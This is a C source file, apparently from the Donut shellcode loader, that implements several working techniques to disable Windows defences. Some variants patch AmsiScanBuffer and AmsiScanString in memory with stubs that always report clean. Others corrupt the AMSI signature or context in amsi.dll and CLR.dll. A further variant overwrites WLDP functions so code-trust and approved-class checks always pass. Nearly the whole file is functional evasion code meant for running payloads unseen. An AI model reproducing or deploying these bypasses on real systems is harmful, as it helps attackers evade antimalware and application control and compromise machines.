/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

typedef enum _WLDP_HOST_ID { 
   WLDP_HOST_ID_UNKNOWN     = 0,
   WLDP_HOST_ID_GLOBAL      = 1,
   WLDP_HOST_ID_VBA         = 2,
   WLDP_HOST_ID_WSH         = 3,
   WLDP_HOST_ID_POWERSHELL  = 4,
   WLDP_HOST_ID_IE          = 5,
   WLDP_HOST_ID_MSI         = 6,
   WLDP_HOST_ID_MAX         = 7
} WLDP_HOST_ID, *PWLDP_HOST_ID;

typedef struct _WLDP_HOST_INFORMATION {
  DWORD        dwRevision;
  WLDP_HOST_ID dwHostId;
  PCWSTR       szSource;
  HANDLE       hSource;
} WLDP_HOST_INFORMATION, *PWLDP_HOST_INFORMATION;

#if defined(BYPASS_AMSI_A)

// fake function that always returns S_OK and AMSI_RESULT_CLEAN
HRESULT WINAPI AmsiScanBufferStub(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT  *result)
{
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

// This function is never called. It's simply used to calculate
// the length of AmsiScanBufferStub above.
//
// The reason it performs a multiplication is because MSVC can identify
// functions that perform the same operation and eliminate them
// from the compiled code. Null subroutines are eliminated, so the body of
// function needs to do something.

int AmsiScanBufferStubEnd(int a, int b) {
    return a * b;
}

// fake function that always returns S_OK and AMSI_RESULT_CLEAN
HRESULT WINAPI AmsiScanStringStub(
    HAMSICONTEXT amsiContext,
    LPCWSTR      string,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT  *result)
{
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

int AmsiScanStringStubEnd(int a, int b) {
    return a + b;
}

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    HMODULE dll;
    DWORD   len, op, t;
    LPVOID  cs;

    // try load amsi. if unable, assume DLL doesn't exist
    // and return TRUE to indicate it's okay to continue
    dll = inst->api.LoadLibraryA(inst->amsi);    
    if(dll == NULL) return TRUE;
    
    // resolve address of AmsiScanBuffer. if not found,
    // return FALSE because it should exist ...
    cs = inst->api.GetProcAddress(dll, inst->amsiScanBuf);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)AmsiScanBufferStubEnd -
          (ULONG_PTR)AmsiScanBufferStub;
    
    DPRINT("Length of AmsiScanBufferStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable. return FALSE on error
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    DPRINT("Overwriting AmsiScanBuffer");
    // over write with virtual address of stub
    Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);   
    // set memory back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
  
    // resolve address of AmsiScanString. if not found,
    // return FALSE because it should exist ...
    cs = inst->api.GetProcAddress(dll, inst->amsiScanStr);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)AmsiScanStringStubEnd -
          (ULONG_PTR)AmsiScanStringStub;
     
    DPRINT("Length of AmsiScanStringStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    DPRINT("Overwriting AmsiScanString");
    // over write with virtual address of stub
    Memcpy(cs, ADR(PCHAR, AmsiScanStringStub), len);   
    // set memory back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
    
    return TRUE;
}

#elif defined(BYPASS_AMSI_B)

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    HMODULE        dll;
    PBYTE          cs;
    DWORD          i, op, t;
    BOOL           disabled = FALSE;
    PDWORD         Signature;
    
    // try load amsi. if unable to load, assume
    // it doesn't exist and return TRUE to indicate
    // it's okay to continue.
    dll = inst->api.LoadLibraryA(inst->amsi);
    if(dll == NULL) return TRUE;
    
    // resolve address of AmsiScanBuffer. if unable, return
    // FALSE because it should exist.
    cs = (PBYTE)inst->api.GetProcAddress(dll, inst->amsiScanBuf);
    if(cs == NULL) return FALSE;
    
    // scan for signature
    for(i=0;;i++) {
      Signature = (PDWORD)&cs[i];
      // is it "AMSI"?
      if(*Signature == *(PDWORD)inst->amsi) {
        // set memory protection for write access
        inst->api.VirtualProtect(cs, sizeof(DWORD), 
          PAGE_EXECUTE_READWRITE, &op);
          
        // change signature
        *Signature++;
        
        // set memory back to original protection
        inst->api.VirtualProtect(cs, sizeof(DWORD), op, &t);
        disabled = TRUE;
        break;
      }
    }
    return disabled;
}

#elif defined(BYPASS_AMSI_C)

// Attempt to find AMSI context in .data section of CLR.dll
// Could also scan PEB.ProcessHeap for this..
// Disabling AMSI via AMSI context is based on idea by Matt Graeber
// https://gist.github.com/mattifestation/ef0132ba4ae3cc136914da32a88106b9

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    LPVOID                   clr;
    BOOL                     disabled = FALSE;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, j, res;
    PBYTE                    ds;
    MEMORY_BASIC_INFORMATION mbi;
    _PHAMSICONTEXT           ctx;
    
    // get address of CLR.dll. if unable, this
    // probably isn't a dotnet assembly being loaded
    clr = inst->api.GetModuleHandleA(inst->clr);
    if(clr == NULL) return FALSE;
    
    dos = (PIMAGE_DOS_HEADER)clr;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, clr, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
      nt->FileHeader.SizeOfOptionalHeader);
             
    // scan all writeable segments while disabled == FALSE
    for(i = 0; 
        i < nt->FileHeader.NumberOfSections && !disabled; 
        i++) 
    {
      // if this section is writeable, assume it's data
      if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
        // scan section for pointers to the heap
        ds = RVA2VA (PBYTE, clr, sh[i].VirtualAddress);
           
        for(j = 0; 
            j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
            j += sizeof(ULONG_PTR)) 
        {
          // get pointer
          ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
          // query if the pointer
          res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
          if(res != sizeof(mbi)) continue;
          
          // if it's a pointer to heap or stack
          if ((mbi.State   == MEM_COMMIT    ) &&
              (mbi.Type    == MEM_PRIVATE   ) && 
              (mbi.Protect == PAGE_READWRITE))
          {
            ctx = (_PHAMSICONTEXT)ptr;
            // check if it contains the signature 
            if(ctx->Signature == *(PDWORD*)inst->amsi) {
              // corrupt it
              ctx->Signature++;
              disabled = TRUE;
              break;
            }
          }
        }
      }
    }
    return disabled;
}

#elif defined(BYPASS_AMSI_D)
// This is where you may define your own AMSI bypass.
// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_C defined.

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    
}

#endif

#if defined(BYPASS_WLDP_A)

// fake function that always returns S_OK and isApproved = TRUE
HRESULT WINAPI WldpIsClassInApprovedListStub(
    REFCLSID               classID,
    PWLDP_HOST_INFORMATION hostInformation,
    PBOOL                  isApproved,
    DWORD                  optionalFlags)
{
    *isApproved = TRUE;
    return S_OK;
}

// make sure prototype and code are different from other subroutines
// to avoid removal by MSVC
int WldpIsClassInApprovedListStubEnd(int a, int b) {
  return a - b;
}

// fake function that always returns S_OK
HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
    HANDLE fileHandle,
    PVOID  baseImage,
    ULONG  ImageSize)
{
    return S_OK;
}

int WldpQueryDynamicCodeTrustStubEnd(int a, int b) {
  return a / b;
}

BOOL DisableWLDP(PDONUT_INSTANCE inst) {
    HMODULE wldp;
    DWORD   len, op, t;
    LPVOID  cs;
    
    // try load wldp. if unable, assume DLL doesn't exist
    // and return TRUE to indicate it's okay to continue
    wldp = inst->api.LoadLibraryA(inst->wldp);  
    if(wldp == NULL) return TRUE;
    
    // resolve address of WldpQueryDynamicCodeTrust
    // if not found, return FALSE because it should exist
    cs = inst->api.GetProcAddress(wldp, inst->wldpQuery);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -
          (ULONG_PTR)WldpQueryDynamicCodeTrustStub;
      
    DPRINT("Length of WldpQueryDynamicCodeTrustStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable. return FALSE on error
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    // overwrite with virtual address of stub
    Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
    // set back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
    
    // resolve address of WldpIsClassInApprovedList
    // if not found, return FALSE because it should exist
    cs = inst->api.GetProcAddress(wldp, inst->wldpIsApproved);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)WldpIsClassInApprovedListStubEnd -
          (ULONG_PTR)WldpIsClassInApprovedListStub;
    
    DPRINT("Length of WldpIsClassInApprovedListStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable. return FALSE on error
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    // overwrite with virtual address of stub
    Memcpy(cs, ADR(PCHAR, WldpIsClassInApprovedListStub), len);
    // set back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
    
    return TRUE;
}
#elif defined(BYPASS_WLDP_B)
// This is where you may define your own WLDP bypass.
// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_WLDP_B defined.

BOOL DisableWLDP(PDONUT_INSTANCE inst) {
    
}
#endif
